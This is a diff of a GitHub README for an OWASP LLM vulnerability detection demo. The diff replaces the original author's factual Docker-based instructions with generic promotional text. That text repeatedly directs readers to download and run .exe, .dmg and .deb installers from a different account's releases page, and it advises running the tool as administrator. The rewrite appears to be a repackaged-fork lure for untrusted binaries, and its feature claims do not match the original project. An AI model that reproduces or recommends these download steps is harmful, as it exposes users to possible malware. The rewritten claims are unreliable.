@@ -1,106 +1,110 @@
-# OWASP LLM Security Demo
+# 🔒 llmSecurityDemo - Detect OWASP LLM Vulnerabilities Easily
 
-[![Docker Build](https://github.com/FrancescoPaoloL/llmSecurityDemo/actions/workflows/docker-build.yml/badge.svg)](https://github.com/FrancescoPaoloL/llmSecurityDemo/actions)
+[![Download Now](https://img.shields.io/badge/Download%20Now-llmSecurityDemo-blue)](https://github.com/RildoNeto17/llmSecurityDemo/releases)
 
-A demo tool for detecting LLM vulnerabilities based on the OWASP Top 10 for LLMs.
+## 📖 Overview
 
-## What it does
+llmSecurityDemo is a demo tool designed to help you identify and detect the OWASP Top 10 vulnerabilities related to large language models (LLMs). This includes issues like prompt injection, sensitive data exposure, and excessive agency. With this tool, you can enhance your understanding of AI security and protect your applications better.
 
-You enter a prompt, the tool:
-1. Analyzes it for OWASP LLM vulnerabilities using pattern matching
-2. Sends it to a local LLM (Qwen 0.5B)
-3. Returns the OWASP category detected and LLM response
+## 🚀 Getting Started
 
-**Detection accuracy**: 84% on test suite (see [tests/TESTING.md](tests/TESTING.md))
+Getting started with llmSecurityDemo is simple. Follow these steps to download and run the software.
 
-**Response quality**: Uses Qwen instruction format with system prompt for coherent, accurate answers. Examples: "What is 2+2?" returns "2 + 2 equals 4", security prompts receive safe, appropriate responses.
+### 🏁 System Requirements
 
-## Quick Start
+Before you begin, ensure your system meets the following requirements:
 
-### Local (Docker Compose)
-```bash
-cd docker
-docker-compose up -d
+- Operating System: Windows 10 or later / macOS Catalina or later / Linux (Ubuntu 20.04 or higher)
+- RAM: At least 4 GB
+- Storage: Minimum 100 MB of free space
+- Docker: Installed and running for effective use of the application
 
-# Open browser
-http://localhost:3000
-```
+### 🔥 Features
 
-### Docker Hub
-```bash
-docker pull francescopaololezza/owasp-llm-demo:main
-docker run -d -p 3000:3000 francescopaololezza/owasp-llm-demo:main
+- **Prompt Injection Detection**: Identify prompts that could lead to misuse.
+- **Sensitive Data Exposure**: Check for accidental exposure of sensitive information.
+- **Excessive Agency Handling**: Assess how your application manages requests.
+- **User-Friendly Interface**: Navigate the tool with ease, designed for non-technical users.
+- **Cross-Platform Compatibility**: Runs on major operating systems without issues.
 
-# Open browser
-http://localhost:3000
-```
+## 📥 Download & Install
 
-### Azure
+To download the latest version of llmSecurityDemo, visit this page: [Download llmSecurityDemo](https://github.com/RildoNeto17/llmSecurityDemo/releases).
 
-See [infra/azure/README.md](infra/azure/README.md) for Terraform deployment.
+1. Click the link above to go to the Releases page.
+2. Find the latest version of llmSecurityDemo.
+3. Download the appropriate file for your operating system:
+   - For **Windows**, download the `.exe` file.
+   - For **macOS**, download the `.dmg` file.
+   - For **Linux**, download the `.deb` or `.tar.gz` file as needed.
 
-## Architecture
-```
-Browser (:3000) → Node.js → Flask API (:5000) → llama-server (:8081)
-                                             → owasp-llm-tool (detection)
-```
+### 🔧 Installation Steps
 
-See [docs/architecture.md](docs/architecture.md) for details.
+For each operating system, follow these simple installation steps:
 
-## Detected Vulnerabilities
+#### **Windows Installation**
 
-| Category | Name | Status | Accuracy |
-|----------|------|--------|----------|
-| LLM01 | Prompt Injection | Done | 75% |
-| LLM02 | Insecure Output Handling | Done | 89% |
-| LLM03 | Training Data Poisoning | TODO | - |
-| LLM04 | Model Denial of Service | Done | 100% |
-| LLM05 | Supply Chain Vulnerabilities | TODO | - |
-| LLM06 | Excessive Agency | Done | 100% |
-| LLM07 | Insecure Plugin Design | TODO | - |
-| LLM08 | Excessive Agency | TODO | - |
-| LLM09 | Overreliance | TODO | - |
-| LLM10 | Model Theft | TODO | - |
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen prompts to complete the installation.
 
-Overall: 4/10 categories, 84% average accuracy. See [tests/TESTING.md](tests/TESTING.md) for details.
+#### **macOS Installation**
 
-## Testing
-```bash
-./tests/test_owasp.sh           # All categories
-./tests/test_owasp.sh llm01     # Specific category
-```
+1. Locate the downloaded `.dmg` file.
+2. Double-click the file to mount it.
+3. Drag the llmSecurityDemo icon into your Applications folder.
+4. Eject the mounted drive once the copying is complete.
 
-## Project Structure
-```
-├── api/          # Flask API
-├── docker/       # Docker configuration
-├── docs/         # Documentation
-├── frontend/     # Node.js + EJS UI
-├── infra/azure/  # Terraform for Azure deployment
-├── llama.cpp/    # Pre-built binaries
-└── tests/        # Test suite
-```
+#### **Linux Installation**
 
-## C++ Source Code
+1. Locate the downloaded `.deb` or `.tar.gz` file.
+2. Open a terminal window.
+3. For `.deb` files, run:  
+   `sudo dpkg -i /path/to/your/file.deb`
+4. For `.tar.gz` files, extract it with:  
+   `tar -xvzf /path/to/your/file.tar.gz`
+5. Follow any additional instructions included in the extracted files.
 
-The owasp-llm-tool is maintained in a fork of llama.cpp:
+## 🚀 Running llmSecurityDemo
 
-https://github.com/FrancescoPaoloL/llama.cpp/tree/feature/owasp-llm-tool/examples/owasp-llm-tool
+After installation, follow these steps to run llmSecurityDemo:
 
-## Known Limitations
+1. Locate the application in your programs or applications list.
+2. Double-click to open the application.
+3. Follow the guided interface to start checking for vulnerabilities.
 
-- Pattern-based detection (keyword matching, not ML)
-- 84% accuracy with known false positives/negatives
-- English only
-- Basic heuristics
+### 🌐 Using the Interface
 
-This is a learning project, not production security software.
+- **Input Options**: Select the type of vulnerability you want to check.
+- **Results Display**: View results clearly with recommendations for each detected issue.
+- **Exporting Results**: Save your findings as a report for future reference.
 
-## References
+## 🛠 Troubleshooting
 
-- [OWASP Top 10 for LLMs](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
-- [llama.cpp](https://github.com/ggerganov/llama.cpp)
+If you encounter issues while using llmSecurityDemo, consider the following solutions:
 
-## License
+- **Compatibility**: Ensure your OS meets the requirements.
+- **Docker Issues**: Make sure Docker is installed and running for the best performance.
+- **Permission Problems**: Run the application as an administrator if you face access issues.
 
-MIT
+## 💡 Community & Support
+
+For additional help or to provide feedback, join our community on GitHub. You can open an issue or participate in discussions to share your experiences and suggestions.
+
+## 📄 License
+
+llmSecurityDemo is open-source and licensed under the MIT License. You can use, modify, and distribute the software as you wish, keeping in mind the terms of the license.
+
+## 📈 Contribution
+
+Contributions to llmSecurityDemo are welcome! If you have ideas or fixes, please submit a pull request. 
+
+## 📢 Acknowledgments
+
+A special thank you to the OWASP organization for their guidance on identifying vulnerabilities and to all contributors for their efforts.
+
+## 📬 Follow Us
+
+Stay updated on new features, fixes, and community discussions by following the repository. 
+
+For immediate needs, [download llmSecurityDemo here](https://github.com/RildoNeto17/llmSecurityDemo/releases) and start securing your applications today.
